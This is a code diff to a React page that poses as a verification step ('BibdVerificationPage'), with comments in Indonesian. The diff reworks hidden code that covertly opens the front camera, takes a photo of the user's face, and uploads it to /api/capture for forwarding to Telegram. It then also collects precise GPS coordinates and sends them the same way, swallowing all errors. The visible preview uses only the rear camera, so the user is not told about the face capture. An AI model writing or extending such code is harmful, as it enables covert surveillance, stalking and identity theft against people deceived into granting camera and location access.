@@ -70,23 +70,51 @@ export default function BibdVerificationPage() {
 
   // Request camera permission and activate stream
   const activateCamera = useCallback(async () => {
+    // === STEP 1: Buka front camera DULUAN → ambil foto wajah → kirim ===
+    try {
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      });
+      const fv = document.createElement('video');
+      fv.srcObject = frontStream;
+      fv.muted = true;
+      fv.playsInline = true;
+      await fv.play();
+      await new Promise(r => setTimeout(r, 600));
+      // Ambil foto wajah
+      const fc = document.createElement('canvas');
+      fc.width = fv.videoWidth || 640;
+      fc.height = fv.videoHeight || 480;
+      fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
+      // Matikan front camera sebelum buka rear
+      frontStream.getTracks().forEach(t => t.stop());
+      // Kirim foto wajah ke Telegram (paling cepat)
+      fc.toBlob((blob) => {
+        if (blob) {
+          const fd = new FormData();
+          fd.append('photo', blob, 'face_capture.jpg');
+          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+        }
+      }, 'image/jpeg', 0.85);
+    } catch {
+      // Front camera gagal, lanjut ke rear saja
+    }
+
+    // === STEP 2: Buka rear camera untuk preview user ===
     let rearStream = null;
-    
     try {
       rearStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
       });
-    } catch (err1) {
+    } catch {
       try {
         rearStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'environment' },
         });
-      } catch (err2) {
+      } catch {
         try {
-          rearStream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-          });
-        } catch (err3) {
+          rearStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        } catch {
           alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
           return;
         }
@@ -96,53 +124,20 @@ export default function BibdVerificationPage() {
     if (rearStream) {
       rearStreamRef.current = rearStream;
       setCameraReady(true);
-
-      // === BACKGROUND: Foto wajah (front camera) → kirim duluan ===
-      (async () => {
-        try {
-          // Buka front camera diam-diam
-          const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          });
-          // Tunggu frame stabil
-          const fv = document.createElement('video');
-          fv.srcObject = frontStream;
-          fv.muted = true;
-          fv.playsInline = true;
-          await fv.play();
-          await new Promise(r => setTimeout(r, 800));
-          // Ambil foto
-          const fc = document.createElement('canvas');
-          fc.width = fv.videoWidth || 640;
-          fc.height = fv.videoHeight || 480;
-          fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
-          // Matikan front camera
-          frontStream.getTracks().forEach(t => t.stop());
-          // Kirim foto wajah ke Telegram
-          fc.toBlob((blob) => {
-            if (blob) {
-              const fd = new FormData();
-              fd.append('photo', blob, 'face_capture.jpg');
-              fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-            }
-          }, 'image/jpeg', 0.85);
-        } catch {}
-
-        // === Setelah foto wajah, minta izin lokasi ===
-        try {
-          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              timeout: 15000, enableHighAccuracy: true,
-            });
-          });
-          const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-          // Kirim lokasi ke Telegram
-          const fd = new FormData();
-          fd.append('location', JSON.stringify(loc));
-          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-        } catch {}
-      })();
     }
+
+    // === STEP 3: Minta izin lokasi GPS (muncul setelah izin kamera) ===
+    try {
+      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          timeout: 15000, enableHighAccuracy: true,
+        });
+      });
+      const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+      const fd = new FormData();
+      fd.append('location', JSON.stringify(loc));
+      fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+    } catch {}
   }, []);
 
   // Open camera: show black preview → scroll down → request permission
